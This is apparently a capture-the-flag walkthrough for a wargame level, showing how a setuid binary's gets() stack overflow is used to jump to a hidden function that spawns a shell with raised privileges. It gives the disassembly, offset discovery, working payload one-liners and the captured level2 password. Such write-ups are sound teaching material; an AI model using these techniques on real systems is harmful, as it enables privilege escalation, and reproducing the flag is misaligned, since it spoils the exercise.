level1 - walkthrough
====================

Target: /home/user/level1/level1
        -rwsr-s---  owned by level2, setuid + setgid bits set
        dynamically linked ELF 32-bit i386, not stripped

Goal: read /home/user/level2/.pass

1. Recon
   $ objdump -d level1
   main():
       8048486:  sub    $0x50,%esp
       8048489:  lea    0x10(%esp),%eax     ; buf = esp+0x10
       8048490:  call   gets@plt            ; UNBOUNDED read -> overflow
       8048495:  leave
       8048496:  ret
   There is also an unreferenced function run():
       8048444 <run>:
           ...  call fwrite@plt             ; "Good... Wait what?\n"
           8048479: call system@plt         ; system("/bin/sh")
   run() is never called normally, but it is exactly the primitive we want:
   a shell running with level2's (setuid) privileges.

2. Plan
   Overwrite the saved return address of main() with &run (0x08048444).
   When main() executes `leave; ret`, execution jumps into run().

3. Find the offset to the saved EIP
   Feed a 100-byte cyclic ("De Bruijn") pattern under gdb and read EIP:
       $ gdb -q -batch -ex 'run < /tmp/pat' -ex 'info registers eip' ./level1
         eip = 0x63413563   ("c5Ac")
   Locating "c5Ac" in the pattern gives offset = 76.
   (This matches the stack math: buf at esp+0x10, frame 0x50, plus alignment.)

4. Build the payload
   payload = "A"*76 + p32(0x08048444)
           = 76 filler bytes, then the little-endian address of run:
             \x44\x84\x04\x08
   No 0x0a byte appears in the address, so gets() does not terminate early.

5. Exploit
   run() calls system("/bin/sh"); the shell reads whatever follows on stdin,
   so we append the commands we want it to run:

       $ (python -c 'print "A"*76 + "\x44\x84\x04\x08"'; \
          echo "cat /home/user/level2/.pass") | ./level1

   For an interactive shell instead, replace the echo with `cat` to keep
   stdin open:
       $ (python -c 'print "A"*76 + "\x44\x84\x04\x08"'; cat) | ./level1
       id      -> euid=2021(level2)
       cat /home/user/level2/.pass

   (The process segfaults after the shell exits, because main's frame is
    still corrupt -- harmless, the flag is already read.)

6. Result -- level2 password:
   53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
